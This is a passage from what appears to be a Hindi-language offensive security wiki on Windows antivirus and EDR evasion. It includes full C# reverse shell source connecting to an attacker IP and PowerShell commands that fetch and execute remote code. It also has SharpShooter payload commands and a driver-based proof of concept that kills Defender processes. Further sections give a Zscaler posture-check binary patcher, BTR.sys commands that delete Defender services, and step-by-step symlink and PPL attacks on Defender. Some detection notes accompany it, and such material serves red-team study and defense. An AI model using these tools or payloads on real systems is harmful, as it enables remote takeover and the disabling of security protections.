C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**वर्तमान Defender प्रक्रिया को बहुत जल्दी terminate कर देगा।**

### अपना reverse shell compile करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे इससे compile करें:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

इसे इसके साथ उपयोग करें:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# compiler का उपयोग

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injectors बनाने के लिए Python का उपयोग करने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## अपना Vulnerable Driver (BYOVD) लाएँ – Kernel Space से AV/EDR को खत्म करना

Storm-2603 ने ransomware छोड़ने से पहले endpoint protections को disable करने के लिए **Antivirus Terminator** नाम की एक छोटी console utility का इस्तेमाल किया। यह tool अपना **vulnerable लेकिन *signed* driver** साथ लाता है और इसका दुरुपयोग करके privileged kernel operations जारी करता है, जिन्हें Protected-Process-Light (PPL) AV services भी block नहीं कर सकतीं।<sup>[[12]](#references)</sup>

मुख्य बातें
1. **Signed driver**: Disk पर भेजी गई file `ServiceMouse.sys` है, लेकिन binary Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से signed driver `AToolsKrnl64.sys` है। चूँकि driver पर Microsoft का valid signature है, इसलिए Driver-Signature-Enforcement (DSE) enabled होने पर भी यह load हो जाता है।
2. **Service installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   पहली line driver को **kernel service** के रूप में register करती है और दूसरी उसे start करती है, ताकि `\\.\ServiceMouse` user land से accessible हो जाए।
3. **Driver द्वारा उपलब्ध कराए गए IOCTLs**
   | IOCTL code | क्षमता                                   |
   |-----------:|------------------------------------------|
   | `0x99000050` | PID के ज़रिए किसी भी process को terminate करना (Defender/EDR services को kill करने के लिए उपयोग किया जाता है) |
   | `0x990000D0` | disk पर मौजूद किसी भी file को delete करना |
   | `0x990001D0` | driver को unload करना और service को remove करना |

   न्यूनतम C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **यह क्यों काम करता है**: BYOVD user-mode protections को पूरी तरह छोड़ देता है; kernel में execute होने वाला code, PPL/PP, ELAM या अन्य hardening features की परवाह किए बिना *protected* processes खोल सकता है, उन्हें terminate कर सकता है या kernel objects के साथ छेड़छाड़ कर सकता है।

पता लगाना / Mitigation
•  Microsoft की vulnerable-driver block list (`HVCI`, `Smart App Control`) enable करें, ताकि Windows `AToolsKrnl64.sys` को load करने से इनकार करे।
•  नई *kernel* services बनने की निगरानी करें और जब कोई driver world-writable directory से load हो या allow-list में मौजूद न हो, तो alert करें।
•  Custom device objects के लिए user-mode handles और उसके बाद होने वाली संदिग्ध `DeviceIoControl` calls पर नज़र रखें।

### Disk पर मौजूद binaries को patch करके Zscaler Client Connector के Posture Checks को bypass करना

Zscaler का **Client Connector** device-posture rules को स्थानीय रूप से लागू करता है और नतीजों को अन्य components तक पहुँचाने के लिए Windows RPC पर निर्भर करता है। दो कमज़ोर design choices से इसे पूरी तरह bypass करना संभव हो जाता है:

1. Posture evaluation **पूरी तरह client-side** होती है (server को एक boolean भेजा जाता है)।
2. Internal RPC endpoints केवल यह validate करते हैं कि connecting executable **Zscaler द्वारा signed** है (`WinVerifyTrust` के ज़रिए)।<sup>[[11]](#references)</sup>

**Disk पर मौजूद चार signed binaries को patch करके**, दोनों mechanisms को निष्क्रिय किया जा सकता है:

| Binary | Patch किया गया मूल logic | नतीजा |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` return करता है, इसलिए हर check compliant होता है |
| `ZSAService.exe` | `WinVerifyTrust` को indirect call | NOP-ed ⇒ कोई भी (unsigned भी) process RPC pipes से जुड़ सकता है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` से बदल दिया जाता है |
| `ZSATunnel.exe` | Tunnel के integrity checks | Short-circuited |

Patcher का संक्षिप्त अंश:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After मूल फ़ाइलों को बदलने और service stack को restart करने के बाद:

* **सभी** posture checks हरे/compliant दिखाई देते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints खोल सकते हैं (जैसे, `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* Compromised host को Zscaler policies द्वारा परिभाषित internal network तक unrestricted access मिल जाता है।

यह case study दिखाता है कि केवल client-side trust decisions और साधारण signature checks को कुछ byte patches से कैसे हराया जा सकता है।

## Microsoft Defender `BTR.sys` की trusted functionality का दुरुपयोग

Defender का **Boot-Time Removal** driver, क्लासिक BYOVD का एक उपयोगी प्रतिउदाहरण है। `BTR.sys` एक वैध Microsoft-signed remediation component है, जिसमें memory-corruption bug या IOCTL interface नहीं है; administrator access और `SeLoadDriverPrivilege` हासिल करने के बाद, operator इसके बजाय इसके private remediation transaction को forge करके इच्छित Ring-0 file/registry operations कर सकता है। यह **post-compromise AV/EDR-neutralization primitive है, initial access या privilege escalation नहीं**, और conspicuous third-party driver import करने के बजाय driver को target के अपने `MpEngine.dll` के `BOOTTIMETOOL` resource से extract किया जा सकता है।<sup>[[36]](#references)</sup>

### एक-बार इस्तेमाल होने वाले driver को stage करना

Defender आमतौर पर इस resource को random `[a-z]{8}.sys` फ़ाइल के रूप में छोड़ता है और इसी तरह के नाम वाली kernel service register करता है। `DriverEntry` service की `Args` value पढ़ता है, referenced NTFS ADS खोलता है, action list को decrypt और validate करता है, feedback लिखता है, और सफल execution के बाद `0xC0000056` (`STATUS_DELETE_PENDING`) लौटाता है, ताकि driver resident रहने के बजाय unload हो जाए। Forged service में निम्नलिखित विशिष्ट values होती हैं।<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream में एक RC4-encrypted blob होता है। विश्लेषित builds में एक fixed 256-byte key दोबारा इस्तेमाल होती है, इसलिए encryption कोई authorization boundary नहीं है। एक मान्य plaintext में 24-byte का global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC और payload से निकली transaction ID) होता है, जिसके बाद null-terminated UTF-16 feedback path और कितने भी items होते हैं। हर item में 16-byte का header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) और action-specific data होता है, जिसका अंत **ठीक चार NUL bytes** से होता है। हर header/data region को CRC-32 polynomial `0xEDB88320`, initial state `0xFFFFFFFF`, और **कोई final XOR नहीं** (`~CRC32`) के साथ अलग-अलग जाँचा जाता है; हर region के लिए CRC state reset की जाती है।<sup>[[36]](#references)[[37]](#references)</sup>

स्वीकार किए गए action IDs इन kernel primitives को उजागर करते हैं।<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Result |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | किसी file को delete करना, locked file सहित |
| 2 | `[UTF-16 path]` | खाली directory हटाना |
| 3 | `[Flags][source][destination]` | किसी file को attacker द्वारा चुने गए protected path पर ले जाना; खाली destination का अर्थ delete करना है |
| 4 | `[Flags][key path]` | Registry key को recursively delete करना |
| 5 | `[Flags][key path + "\\" + value]` | Registry value delete करना |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Registry value बनाना/अपडेट करना और अनुपस्थित key paths बनाना |

Actions 5 और 6 के लिए, wire पर key/value separator **लगातार दो backslashes** होता है; सामान्य रूप से format किया गया path सही तरह से split नहीं होगा। Feedback file ज़्यादातर request को दोहराती है, लेकिन हर item के पहले चार data bytes उसके परिणामी `NTSTATUS` बन जाते हैं। Actions 1 और 2 के लिए, जिनमें leading flags field नहीं होता, BTR status के लिए जगह बनाने हेतु path को चार reserved trailing bytes में shift कर देता है।<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow और early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) पूरी chain लागू करता है: local Defender से `BTR.sys` extract करना, `<random>.sys:changelist` और एक feedback stream बनाना, chained actions को serialize/checksum/encrypt करना, सीधे service registry key बनाना, फिर `-trigger now` के लिए `NtLoadDriver` call करना या `-trigger boot` के लिए इसे system-start driver के रूप में छोड़ देना। सीधे registry staging करने से सामान्य SCM `CreateServiceW` path का उपयोग नहीं होता और इसलिए service-install Event ID 7045 **जनरेट नहीं होता**। Boot-triggered artifacts को बाद में `BTR_CLI.exe -cleanup <service_name>` से हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` उपयोगी नहीं है, क्योंकि storage stack और `SystemRoot` link तैयार होने से पहले BTR, `DriverEntry` से file I/O करता है। `Start=1` और high-priority `Boot Bus Extender` group के साथ यह Phase 1 में चलता है: NTFS उपयोग के लिए तैयार होता है, लेकिन कई system-start security drivers और user-mode EDR services अभी initialize नहीं हुए होते। `WdFilter` जैसे boot-start filters पहले ही लोड हो सकते हैं, फिर भी BTR अगले start से पहले उनकी binaries या service configuration हटा सकता है और SCM द्वारा launch किए जाने से पहले service executables मिटा सकता है। ELAM इस कमी को दूर नहीं करता, क्योंकि BTR boot-start evaluation के बाद चलता है और उसके पास valid Microsoft signature होता है।<sup>[[36]](#references)</sup>

एक transaction में कई actions चलते हैं। PoC, hard-coded `\SystemRoot\Temp\BootClean.log` के लिए Action 1 को सबसे पहले जोड़ता है: BTR यह log बनाता है, फिर अपने delete request को पूरा करके unload होने से पहले उसे हटा देता है। इससे सबूत कम होते हैं, जबकि `<random>.sys:<random>.dat` में feedback रखने से driver और दोनों streams को एक साथ हटाया जा सकता है।<sup>[[36]](#references)[[37]](#references)</sup>

### उच्च-सिग्नल detection correlations

केवल signature पर आधारित rules और Microsoft vulnerable-driver blocklist, BTR की intended functionality के दुरुपयोग को नहीं रोकते। इन behavioral correlations को प्राथमिकता दें और वैध Defender lineage को किसी भी arbitrary launcher से अलग पहचानें।<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` का बनना BTR staging में हमेशा होता है। उसी `.sys` से जुड़ा `.dat` ADS विशेष रूप से संदिग्ध है, क्योंकि वैध Defender आम तौर पर feedback को `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` के नीचे रखता है।
- **Sysmon 12/13 बिना System 7045 के:** `HKLM\SYSTEM\CurrentControlSet\Services\<random>` में `Args=...:changelist` और `Group=Boot Bus Extender` के साथ सीधे की गई creation को correlate करें, जब उससे मेल खाता SCM installation event न हो।
- **Sysmon 6 -> 23:** गैर-Defender lineage से हुए किसी ज्ञात BTR driver load को उसके बाद `System`/PID 4 द्वारा की गई file deletion से correlate करें, खासकर security binaries के लिए।
- **Sysmon 11 -> 23:** `System`/PID 4 द्वारा `\SystemRoot\Temp\BootClean.log` को तेज़ी से बनाने और मिटाने पर alert करें।
- `SeLoadDriverPrivilege` देने और enable करने पर नियंत्रण रखें और उसका audit करें; जब `cmd.exe`, PowerShell या कोई अज्ञात process security-tool driver को stage कर रहा हो, तो केवल Microsoft signature पर्याप्त भरोसे का आधार नहीं है।

## LOLBINs के ज़रिए AV/EDR से छेड़छाड़ के लिए Protected Process Light (PPL) का दुरुपयोग

Protected Process Light (PPL), signer/level hierarchy लागू करता है, ताकि केवल समान या उच्च स्तर वाले protected processes ही एक-दूसरे से छेड़छाड़ कर सकें। Offensive दृष्टिकोण से, यदि आप वैध रूप से PPL-enabled binary launch कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो logging जैसी benign functionality को AV/EDR द्वारा इस्तेमाल की जाने वाली protected directories में write करने के लिए सीमित, PPL-backed primitive में बदल सकते हैं।<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

PPL के रूप में process चलाने के लिए
- Target EXE (और लोड की गई कोई भी DLL) को PPL-capable EKU से sign किया हुआ होना चाहिए।
- Process को इन flags के साथ CreateProcess का उपयोग करके बनाया जाना चाहिए: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`।
- Binary के signer से मेल खाने वाला compatible protection level माँगा जाना चाहिए (उदाहरण के लिए, anti-malware signers के लिए `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers के लिए `PROTECTION_LEVEL_WINDOWS`)। गलत levels देने पर process creation विफल हो जाएगी।

PP/PPL और LSASS protection के व्यापक परिचय के लिए यह भी देखें:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level चुनता है और arguments target EXE को देता है):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- उपयोग का तरीका:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` खुद एक नई प्रक्रिया शुरू करता है और caller द्वारा निर्दिष्ट path पर log file लिखने के लिए एक parameter स्वीकार करता है।
- PPL process के रूप में लॉन्च किए जाने पर, फ़ाइल लेखन PPL backing के साथ होता है।
- ClipUp उन paths को parse नहीं कर सकता जिनमें spaces हों; सामान्यतः सुरक्षित locations तक पहुँचने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- Short names की सूची देखें: हर parent directory में `dir /x` चलाएँ।
- cmd में short path निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launcher (उदाहरण के लिए, CreateProcessAsPPL) का उपयोग करके PPL-सक्षम LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ लॉन्च करें।
2) Protected AV directory (उदाहरण के लिए, Defender Platform) में file creation के लिए बाध्य करने हेतु ClipUp का log-path argument दें। ज़रूरत पड़ने पर 8.3 short names का उपयोग करें।
3) अगर AV चलते समय target binary सामान्यतः खुली/locked रहती है (उदाहरण के लिए, MsMpEng.exe), तो AV शुरू होने से पहले boot पर write शेड्यूल करें; इसके लिए ऐसा auto-start service इंस्टॉल करें जो भरोसेमंद ढंग से पहले चलता हो। Process Monitor (boot logging) से boot ordering की पुष्टि करें।
4) Reboot पर, AV द्वारा अपनी binaries को lock करने से पहले PPL-backed write होता है, जिससे target file corrupt हो जाती है और startup रुक जाता है।

उदाहरण invocation (सुरक्षा के लिए paths हटाए/छोटे किए गए हैं):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

नोट्स और सीमाएँ
- आप यह नियंत्रित नहीं कर सकते कि ClipUp क्या सामग्री लिखता है; placement के अलावा कुछ नियंत्रित नहीं होता। यह primitive सटीक content injection के बजाय corruption के लिए उपयुक्त है।
- service इंस्टॉल/स्टार्ट करने और reboot window के लिए local admin/SYSTEM आवश्यक है।
- Timing महत्वपूर्ण है: target खुला नहीं होना चाहिए; boot-time execution से file locks से बचा जा सकता है।

पता लगाने के तरीके
- Boot के आसपास असामान्य arguments के साथ `ClipUp.exe` का process creation, खासकर जब उसका parent कोई non-standard launcher हो।
- ऐसी नई services जो संदिग्ध binaries को auto-start के लिए configure की गई हों और लगातार Defender/AV से पहले शुरू होती हों। Defender startup failures से पहले service creation/modification की जाँच करें।
- Defender binaries/Platform directories की file integrity monitoring; protected-process flags वाले processes द्वारा अप्रत्याशित file creation/modification।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए processes और non-AV binaries द्वारा PPL level के असामान्य उपयोग की जाँच करें।

Mitigations
- WDAC/Code Integrity: PPL के रूप में चल सकने वाली signed binaries और उनके parent processes को सीमित करें; वैध contexts के बाहर ClipUp invocation को block करें।
- Service hygiene: auto-start services बनाने/बदलने पर रोक लगाएँ और start-order manipulation की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections enabled हों; binary corruption के संकेत देने वाली startup errors की जाँच करें।
- यदि आपके environment के अनुकूल हो, तो security tooling वाली volumes पर 8.3 short-name generation बंद करने पर विचार करें (अच्छी तरह test करें)।

## Platform Version Folder Symlink Hijack के ज़रिए Microsoft Defender के साथ छेड़छाड़

Windows Defender यह चुनता है कि वह किस platform से चलेगा। इसके लिए वह इन subfolders को enumerate करता है:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

यह सबसे ऊँची lexicographic version string वाला subfolder चुनता है (जैसे, `4.18.25070.5-0`), फिर वहीं से Defender service processes शुरू करता है (और service/registry paths को उसी के अनुसार update करता है)। यह चयन directory reparse points (symlinks) समेत directory entries पर भरोसा करता है। एक administrator Defender को attacker-writable path पर redirect करने और DLL sideloading या service disruption करने के लिए इसका फ़ायदा उठा सकता है।<sup>[[21]](#references)[[22]](#references)</sup>

पूर्वापेक्षाएँ
- Local Administrator (Platform folder के तहत directories/symlinks बनाने के लिए आवश्यक)
- Reboot करने या Defender platform को फिर से चुनने के लिए trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools आवश्यक हैं (mklink)

यह क्यों काम करता है
- Defender अपने folders में writes को block करता है, लेकिन उसका platform selection directory entries पर भरोसा करता है और यह सत्यापित किए बिना कि target किसी protected/trusted path पर resolve होता है, lexicographically सबसे ऊँचा version चुनता है।

चरण-दर-चरण (उदाहरण)
1) मौजूदा platform folder की एक writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर इंगित करने वाला higher-version directory symlink बनाएँ:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (रीबूट अनुशंसित):
```cmd
shutdown /r /t 0
```
4) पुष्टि करें कि MsMpEng.exe (WinDefend) redirected path से चल रहा है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के अंतर्गत नया process path और उस location को दर्शाने वाला service configuration/registry दिखाई देना चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender की application directory से load होने वाली DLLs को drop/replace करके Defender के processes में code execute करें। ऊपर दिया गया section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying)।
- Service kill/denial: version-symlink हटाएँ, ताकि अगले start पर configured path resolve न हो और Defender start होने में विफल रहे:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> ध्यान दें कि यह तकनीक अपने आप privilege escalation नहीं देती; इसके लिए admin rights आवश्यक हैं।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, target module की Import Address Table (IAT) को hook करके और चुने हुए APIs को attacker-controlled, position-independent code (PIC) के ज़रिए route करके, runtime evasion को C2 implant से निकालकर target module में ले जा सकती हैं। इससे evasion उन APIs के छोटे दायरे से आगे बढ़ता है जिन्हें कई kits उपलब्ध कराते हैं (जैसे CreateProcessA), और यही सुरक्षा BOFs तथा post-exploitation DLLs तक भी पहुँचती है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

उच्च-स्तरीय तरीका
- Reflective loader (पहले से जोड़ा हुआ या companion) का उपयोग करके target module के साथ PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- Host DLL लोड होते समय, उसके IMAGE_IMPORT_DESCRIPTOR को देखें और लक्षित imports (जैसे CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के IAT entries को पतले PIC wrappers की ओर point करें।
- हर PIC wrapper, असली API address को tail-call करने से पहले evasion लागू करता है। आम evasions में शामिल हैं:
  - Call के दौरान memory को mask/unmask करना (जैसे beacon regions को encrypt करना, RWX→RX करना, page names/permissions बदलना), फिर call के बाद उन्हें restore करना।
  - Call-stack spoofing: एक benign stack तैयार करें और target API में transition करें, ताकि call-stack analysis में अपेक्षित frames दिखाई दें।<sup>[[9]](#references)</sup>
- Compatibility के लिए एक interface export करें, ताकि Aggressor script (या equivalent) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

यहाँ IAT hooking क्यों
- यह ऐसे किसी भी code के लिए काम करता है जो hooked import का उपयोग करता है; इसके लिए tool code में बदलाव करने या विशिष्ट APIs को proxy करने के लिए Beacon पर निर्भर रहने की ज़रूरत नहीं होती।
- Post-ex DLLs को भी cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे System.Management.Automation.dll, clr.dll) को intercept कर सकते हैं और उनके API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके, call-stack–आधारित detections के विरुद्ध process-spawning post-ex commands का विश्वसनीय उपयोग बहाल करता है।

न्यूनतम IAT hook रूपरेखा (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Relocations/ASLR के बाद और import के पहले उपयोग से पहले patch लागू करें। TitanLdr/AceLdr जैसे Reflective loaders, लोड किए गए module के DllMain के दौरान hooking करने के उदाहरण हैं।
- Wrappers को छोटा और PIC-safe रखें; patching से पहले capture की गई मूल IAT value या LdrGetProcedureAddress के ज़रिए असली API resolve करें।
- PIC के लिए RW → RX transitions का उपयोग करें और writable+executable pages न छोड़ें।

Call‑stack spoofing stub
- Draugr-शैली के PIC stubs एक नकली call chain बनाते हैं (benign modules के return addresses के साथ), फिर असली API पर pivot करते हैं।
- इससे वे detections नाकाम होते हैं जो Beacon/BOFs से sensitive APIs तक canonical stacks की अपेक्षा करते हैं।
- API prologue से पहले अपेक्षित frames के भीतर पहुँचने के लिए इसे stack cutting/stack stitching techniques के साथ इस्तेमाल करें।

Operational integration
- Reflective loader को post-ex DLLs के आगे जोड़ें, ताकि DLL लोड होने पर PIC और hooks अपने आप initialise हो जाएँ।
